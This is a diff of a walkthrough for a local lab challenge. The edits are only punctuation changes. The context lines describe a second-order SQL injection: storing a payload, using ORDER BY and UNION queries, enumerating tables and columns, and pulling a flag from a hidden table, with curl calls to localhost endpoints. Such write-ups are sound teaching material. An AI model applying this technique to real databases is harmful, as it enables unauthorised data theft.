@@ -108,12 +108,12 @@ as a potential second-order injection vector:
 
 Unlike p3_1, Step 2's report route is fully in-band: it renders whatever
 the vulnerable query returns directly into the page, including errors. That
-makes enumeration straightforward — store a payload via Step 1, trigger
+makes enumeration straightforward: store a payload via Step 1, trigger
 Step 2, read the result from the report table. Use the reset endpoint
 (`/p3/cursedcard/reset`) between steps to clear previous payloads so the
 appraiser always re-checks the freshest inscription.
 
-### Step 0 — confirm the injection and find the column count
+### Step 0: confirm the injection and find the column count
 
 The vulnerable query selects three columns. A UNION must match that count
 exactly. Confirm with `ORDER BY`:
@@ -142,7 +142,7 @@ curl -s http://localhost:8000/p3/cursedcard/report
 # → report table shows id=1, owner=2, inscription=3  ✓
 ```
 
-### Step 1 — get the current database name
+### Step 1: get the current database name
 
 ```bash
 curl -s http://localhost:8000/p3/cursedcard/reset
@@ -152,7 +152,7 @@ curl -s http://localhost:8000/p3/cursedcard/report
 # → owner column: seiyaku_p3_cursed
 ```
 
-### Step 2 — enumerate tables in that database
+### Step 2: enumerate tables in that database
 
 ```bash
 curl -s http://localhost:8000/p3/cursedcard/reset
@@ -168,7 +168,7 @@ curl -s http://localhost:8000/p3/cursedcard/report
 Two tables: `player_cards` (the visible deck) and `vault_cards` (never
 referenced by any route's own queries).
 
-### Step 3 — enumerate columns of `vault_cards`
+### Step 3: enumerate columns of `vault_cards`
 
 ```bash
 curl -s http://localhost:8000/p3/cursedcard/reset
@@ -182,7 +182,7 @@ curl -s http://localhost:8000/p3/cursedcard/report
 
 Three columns: `id`, `card_name`, `secret`. The flag is in `secret`.
 
-### Step 4 — extract the flag
+### Step 4: extract the flag
 
 Step 2's vulnerable query selects three columns in the order `id, owner,
 inscription`. The UNION must match that same 3-column shape. Map
